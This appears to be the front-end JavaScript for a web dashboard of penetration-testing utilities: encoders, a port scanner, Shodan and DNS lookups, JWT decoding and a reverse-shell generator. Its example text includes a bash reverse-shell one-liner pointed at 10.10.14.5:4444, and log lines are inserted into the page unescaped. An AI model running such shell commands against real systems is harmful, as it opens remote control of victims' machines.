document.addEventListener('DOMContentLoaded', () => {
    let currentTool = null;
    
    // Elementy Główne
    const toolsListEl = document.getElementById('toolsList');
    const runBtn = document.getElementById('runBtn');
    const inputText = document.getElementById('inputText');
    const outputText = document.getElementById('outputText');
    const paramKey = document.getElementById('paramKey');
    const currentToolLabel = document.getElementById('currentToolName');
    const externalLink = document.getElementById('externalLink');
    const searchInput = document.getElementById('searchTools');
    const inputLabel = document.getElementById('inputLabel');
    
    // Elementy Info Tab
    const infoToolName = document.getElementById('infoToolName');
    const infoDescription = document.getElementById('infoDescription');
    const infoInputFormat = document.getElementById('infoInputFormat');
    const infoKeyFormat = document.getElementById('infoKeyFormat');
    const infoExample = document.getElementById('infoExample');

    // Elementy Logs Tab
    const logConsole = document.getElementById('logConsole');

    // --- 1. OBSŁUGA ZAKŁADEK (TAB SWITCHING) ---
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            // Usuń klasę active ze wszystkich przycisków i treści
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));

            // Dodaj klasę active do klikniętego przycisku i odpowiedniej treści
            btn.classList.add('active');
            const tabId = 'tab-' + btn.dataset.tab;
            document.getElementById(tabId).classList.add('active');
        });
    });

    // --- 2. POBIERANIE LISTY NARZĘDZI ---
    fetch('/api/tools')
        .then(r => r.json())
        .then(tools => renderTools(tools))
        .catch(err => console.error("API Error:", err));

    function renderTools(tools) {
        toolsListEl.innerHTML = '';
        const categories = {};
        
        // Grupuj narzędzia
        tools.forEach(t => {
            if (!categories[t.category]) categories[t.category] = [];
            categories[t.category].push(t);
        });

        // Generuj HTML listy
        for (const [catName, catTools] of Object.entries(categories)) {
            const header = document.createElement('div');
            header.className = 'category-header';
            header.innerText = catName.toUpperCase();
            toolsListEl.appendChild(header);

            catTools.forEach(tool => {
                const btn = document.createElement('button');
                btn.className = 'tool-btn';
                btn.innerText = tool.name;
                btn.onclick = () => selectTool(tool, btn);
                toolsListEl.appendChild(btn);
            });
        }
    }

    // --- 3. WYBÓR NARZĘDZIA (SELECT TOOL) ---
    function selectTool(tool, btnElement) {
        currentTool = tool;

        // A. Aktualizacja Workspace
        currentToolLabel.innerText = tool.name.toUpperCase();
        inputLabel.innerText = (tool.inputLabel || "INPUT").toUpperCase();
        inputText.placeholder = `Enter ${tool.inputLabel || "text"} here...`;

        // B. Aktualizacja Tool Info (Zakładka Info)
        infoToolName.innerText = tool.name.toUpperCase();
        infoDescription.innerText = tool.description || "No description available.";
        infoInputFormat.innerText = tool.inputLabel || "Any text";
        infoKeyFormat.innerText = tool.keyLabel || (tool.needsKey ? "Required" : "Not required");
        infoExample.innerText = getToolExample(tool.name); // Pobierz przykład

        // C. Konfiguracja Pola Key (Widoczność)
        if (tool.needsKey || tool.keyLabel) {
            paramKey.classList.remove('hidden');
            paramKey.placeholder = tool.keyLabel || "Key";
            paramKey.style.borderColor = tool.needsKey ? "var(--accent)" : "#333";
            
            // Domyślny port dla RevShell
            if (tool.name === 'revshell') paramKey.value = "4444";
            else paramKey.value = "";
        } else {
            paramKey.classList.add('hidden');
        }

        // D. Podświetlenie przycisku
        document.querySelectorAll('.tool-btn').forEach(b => b.classList.remove('active'));
        btnElement.classList.add('active');
    }

    // Helper: Przykłady użycia (Hardcoded dla szybkości)
    function getToolExample(toolName) {
        const examples = {
            'base64': 'Input: Hello World\nOutput: SGVsbG8gV29ybGQ=',
            'xor': 'Input: SecretMessage\nKey: 123\nOutput: [Encrypted Bytes]',
            'portscan': 'Input: 192.168.1.1\nOutput: Open ports: 22, 80, 443',
            'revshell': 'Input: 10.10.14.5 (LHOST)\nKey: 4444 (LPORT)\nOutput: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1',
            'dns': 'Input: google.com\nOutput: A, MX, TXT, NS records',
            'shodan': 'Input: 8.8.8.8\nOutput: Host details from Shodan API',
            'jwt': 'Input: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nOutput: Decoded Header & Payload',
            'subdomains': 'Input: example.com\nOutput: List of subdomains found via crt.sh',
            'emailheaders': 'Input: [Paste raw email headers from "Show Original" in Gmail]\nOutput: SPF/DKIM status, IP chain, phishing risk score',
            
            
        };
        return examples[toolName] || 'No example available yet.';
    }

    // --- 4. URUCHAMIANIE (RUN) ---
    async function runTool() {
        if (!currentTool) return;
        
        runBtn.innerText = "...";
        outputText.value = "Processing...";
        externalLink.classList.add('hidden');

        try {
            const res = await fetch('/api/run', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    tool: currentTool.name,
                    text: inputText.value,
                    key: paramKey.value
                })
            });

            const data = await res.json();
            
            if (data.error) {
                outputText.value = "ERROR: " + data.error;
            } else {
                outputText.value = data.result;
                if (data.external_url) {
                    externalLink.href = data.external_url;
                    externalLink.classList.remove('hidden');
                }
            }
        } catch (e) {
            outputText.value = "Network Error: " + e;
        } finally {
            runBtn.innerText = "RUN ▷";
        }
    }

    // --- 5. SYSTEM LOGS (POLLING) ---
    setInterval(() => {
        fetch('/api/logs')
            .then(r => r.json())
            .then(logs => {
                if (!logs || logs.length === 0) return;
                
                // Renderowanie kolorowych logów
                const logHtml = logs.map(line => {
                    let color = "#00ff00"; // Info = Green
                    if (line.includes("ERROR")) color = "#ff4444"; // Error = Red
                    if (line.includes("WARN")) color = "#ffbb33";  // Warn = Orange
                    if (line.includes("SUCCESS")) color = "#00d084"; // Success = Cyan/Green
                    
                    return `<div style="color:${color}">${line}</div>`;
                }).join('');

                logConsole.innerHTML = logHtml;
                // Auto-scroll na sam dół
                logConsole.scrollTop = logConsole.scrollHeight;
            })
            .catch(() => {});
    }, 2000); // Odśwież co 2 sekundy

    // --- 6. EVENT LISTENERS ---
    runBtn.addEventListener('click', runTool);
    
    // Ctrl+Enter
    inputText.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.key === 'Enter') runTool();
    });

    // Search bar
    searchInput.addEventListener('input', (e) => {
        const val = e.target.value.toLowerCase();
        document.querySelectorAll('.tool-btn').forEach(btn => {
            btn.style.display = btn.innerText.toLowerCase().includes(val) ? 'block' : 'none';
        });
    });

    // Clear Logs
    document.getElementById('clearLogs').addEventListener('click', () => {
        logConsole.innerHTML = '<div style="color: #666;">> Console cleared locally.</div>';
    });

    // Copy Output
    document.getElementById('copyBtn').addEventListener('click', () => {
        outputText.select();
        document.execCommand('copy');
    });
    // --- CHAIN MODE (Output -> Input) ---
document.getElementById('chainBtn').addEventListener('click', () => {
    const output = outputText.value;
    
    if (!output || output.startsWith("ERROR:") || output.includes("[EXIT ERROR")) {
        alert("Cannot chain error output!");
        return;
    }

    // 1. Przenieś wynik do inputu
    inputText.value = output;
    
    // 2. Wyczyść output
    outputText.value = "";
    
    // 3. Efekt wizualny (opcjonalny)
    inputText.style.borderColor = "var(--accent)";
    setTimeout(() => { inputText.style.borderColor = "transparent"; }, 500);

    // 4. Przełącz na zakładkę Workspace (jeśli jesteśmy gdzie indziej)
    document.querySelector('[data-tab="workspace"]').click();
    
    // 5. Komunikat w logach (lokalnie)
    logConsole.innerHTML += `<div style="color: #00d084;">> Chained output to input. Select next tool.</div>`;
    logConsole.scrollTop = logConsole.scrollHeight;
});
});

